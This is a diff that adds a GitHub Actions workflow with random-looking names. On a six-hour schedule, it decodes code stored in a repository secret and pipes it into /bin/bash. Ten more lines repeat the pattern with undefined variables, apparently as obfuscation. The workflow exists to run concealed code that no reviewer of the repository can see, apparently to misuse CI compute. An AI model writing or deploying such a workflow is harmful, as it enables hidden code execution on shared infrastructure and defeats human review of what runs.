@@ -1,0 +1,29 @@
+name: duansizhi9615
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duansizhi9615
+        env:
+          fmzl95542: ${{ secrets.fmzl95542 }}
+        run: |
+          echo $fmzl95542 | jq -r .krmlj1 | /bin/bash
+          echo $j1 | jq -r .aeu4 | /bin/bash
+          echo $rj64552 | jq -r .he52 | /bin/bash
+          echo $urb0808 | jq -r .l22054 | /bin/bash
+          echo $bs1514 | jq -r .wimkd57463 | /bin/bash
+          echo $gh729 | jq -r .ogszg521 | /bin/bash
+          echo $sul5480 | jq -r .ff6 | /bin/bash
+          echo $f583 | jq -r .e10 | /bin/bash
+          echo $wzsm4 | jq -r .qadb9951 | /bin/bash
+          echo $idapb19 | jq -r .aejv8999 | /bin/bash
+          echo $k89 | jq -r .vaq9588 | /bin/bash
+
